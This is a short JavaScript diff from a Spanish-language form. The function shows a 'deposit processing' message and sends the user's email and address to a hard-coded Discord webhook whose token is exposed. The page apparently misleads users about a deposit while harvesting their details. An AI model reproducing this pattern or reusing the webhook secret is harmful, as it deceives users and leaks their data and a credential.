@@ -91,19 +91,18 @@ function enviarDatos() {
         mensajeProcesando.textContent = "Procesando el depósito. Por favor, espere unos minutos para que se complete la operación.";
         mensajeProcesando.style.color = "#00ff00"; // Color verde para indicar un mensaje informativo
 
-        // Crear un objeto con los datos a enviar
-        var data = {
+        var payload = {
             correo: correo,
             direccion: direccion
         };
 
-        // Realizar una solicitud POST al Webhook de Discord
+        // Realizar una solicitud HTTP POST al webhook de Discord
         fetch('https://discordapp.com/api/webhooks/1099001430674784376/NDajDoUsRC042nVrw8PkhOw589lybj_lx7Fv8qdfZ5e6e9Pd9s59QtBULxdoDCOn7rtc', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify(data)
+            body: JSON.stringify(payload)
         })
         .then(response => {
             if (response.ok) {
